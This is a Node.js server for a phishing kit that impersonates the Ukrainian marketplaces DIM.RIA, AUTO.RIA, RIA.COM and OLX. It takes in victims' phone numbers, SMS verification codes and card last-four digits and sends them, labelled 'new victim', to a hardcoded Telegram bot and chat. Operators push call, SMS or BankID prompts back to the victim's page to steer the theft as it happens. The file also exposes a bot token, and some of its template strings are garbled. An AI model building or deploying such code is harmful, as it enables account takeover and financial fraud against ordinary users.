const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// ТВОИ ДАННЫЕ
const BOT_TOKEN = "8311394660:AAEt9CJLYspkbVUcopIYik2KFh1EXLgIko8";
const CHAT_ID = "-1003298945563";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Хранилище сессий
const sessions = new Map(); // sessionId → { phone, city, worker, project, pendingCommand }

app.use(bodyParser.json());
app.use(express.static(__dirname));

// === ЛОГОТИПЫ ===
const LOGOS = {
    dimria: "https://play-lh.googleusercontent.com/ztuWEFjw0OavxEvC_Zsxfg9J8gRj_eRFdsSMM7ElokPPUwmc2lAqCW47wbESieS6bw",
    autoria: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ed/43/65/ed436516-dde8-f65c-d03b-99a9f905fcbd/AppIcon-0-1x_U007emarketing-0-8-0-85-220-0.png/1200x630wa.png",
    ria: "https://ria.riastatic.com/dist/img/logo900.png",
    olx: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/59/21/61/592161cf-9ee3-135c-3e1b-3510535e4b0a/AppIcon_OLX_EU-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png"
};

const PROJECT_NAMES = {
    dimria: "DIM.RIA", autoria: "AUTO.RIA", ria: "RIA.COM", olx: "OLX.UA"
};

// Главная страница
app.get('/', (req, res) => {
    const project = req.query.project || 'dimria';
    if (!Object.keys(LOGOS).includes(project)) return res.status(400).send('Invalid project');
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/logo', (req, res) => {
    const project = req.query.project || 'dimria';
    res.redirect(LOGOS[project] || LOGOS.dimria);
});

// Получение команды для сессии (long polling)
app.get('/api/command', (req, res) => {
    const { session } = req.query;
    const data = sessions.get(session);
    const cmd = data?.pendingCommand || '';
    if (cmd && data) {
        data.pendingCommand = ''; // сбрасываем после отдачи
    }
    res.send(cmd);
});

// Приём данных от жертвы
app.post('/api/send-data', async (req, res) => {
    const { session, type, phone, code, digits, city = 'Невідомо', worker = '', project = 'dimria' } = req.body;

    if (!sessions.has(session)) {
        sessions.set(session, { phone: '', city, worker, project, projName: PROJECT_NAMES[project] || 'DIM.RIA', pendingCommand: '' });
    }

    const data = sessions.get(session);
    if (phone) data.phone = phone;

    let message = '';

    if (type === 'phone') {
        message = `*НОВА ЖЕРТВА* ⚡\n*Проект:* \( {data.projName}\n*Номер:* \` \){phone}\`\n*Місто:* \( {city}\n \){worker ? `*Воркер:* @${worker}` : ''}`;
    }
    else if (type === 'code') {
        message = `*SMS КОД:* \`\( {code}\`\n*Номер:* \` \){data.phone}\`\n*Проект:* ${data.projName}`;
    }
    else if (type === 'last4') {
        message = `*ДЗВІНОК — ОСТАННІ 4 ЦИФРИ:* \`\( {digits}\`\n*Номер:* \` \){data.phone}\`\n*Проект:* ${data.projName}`;
    }

    if (message) {
        const keyboard = {
            inline_keyboard: [[
                { text: "Звонок", callback_data: `call|${session}` },
                { text: "Код", callback_data: `sms|${session}` },
                { text: "BankID", callback_data: `bankid|${session}` }
            ]]
        };
        await sendTelegram(message, keyboard);
    }

    res.json({ success: true });
});

// === ДИНАМИЧЕСКИЙ ВЕБХУК ===
app.post('/', async (req, res) => {
    // Это и есть наш универсальный вебхук!
    const update = req.body;

    if (update.callback_query) {
        const callback = update.callback_query;
        const [action, session] = callback.data.split('|');

        if (sessions.has(session)) {
            const target = action === 'call' ? 'call' : action === 'sms' ? 'sms' : 'bankid';
            sessions.get(session).pendingCommand = target;
        }

        // Ответ на callback
        await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                callback_query_id: callback.id,
                text: action === 'call' ? "Дзвінок активовано" : action === 'sms' ? "SMS активовано" : "BankID активовано",
                show_alert: false
            })
        });
    }

    res.sendStatus(200);
});

// Функция отправки в телегу
async function sendTelegram(text, reply_markup = null) {
    try {
        await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text,
                parse_mode: 'Markdown',
                reply_markup
            })
        });
    } catch (e) {
        console.error('TG Error:', e.message);
    }
}

// === АВТОМАТИЧЕСКАЯ УСТАНОВКА ВЕБХУКА ===
async function setWebhook() {
    const domain = process.env.RENDER_EXTERNAL_URL || // Render
                   process.env.RAILWAY_STATIC_URL ||  // Railway
                   process.env.HEROKU_URL ||          // Heroku
                   `https://${process.env.HOST || require('os').hostname()}.onrender.com`; // запасной

    const url = `\( {domain.replace(/\/ \)/, '')}/`; // главное — слеш в конце!

    try {
        const res = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
        const info = await res.json();
        if (info.result?.url === url) {
            console.log('Вебхук вже встановлено:', url);
            return;
        }

        const set = await fetch(`\( {TELEGRAM_API}/setWebhook?url= \){url}`);
        const result = await set.json();

        if (result.ok) {
            console.log('Вебхук успішно встановлено:', url);
            await sendTelegram(`*СЕРВЕР ЗАПУЩЕНО АВТОМАТИЧНО* ✅\nПроекти: DIM.RIA • AUTO.RIA • RIA • OLX`);
        } else {
            console.error('Помилка установки вебхука:', result);
        }
    } catch (e) {
        console.error('Не вдалося встановити вебхук:', e.message);
    }
}

// Запуск
app.listen(PORT, async () => {
    console.log(`Сервер запущено на порту ${PORT}`);
    await setWebhook(); // ← Автоматична установка вебхука!
});
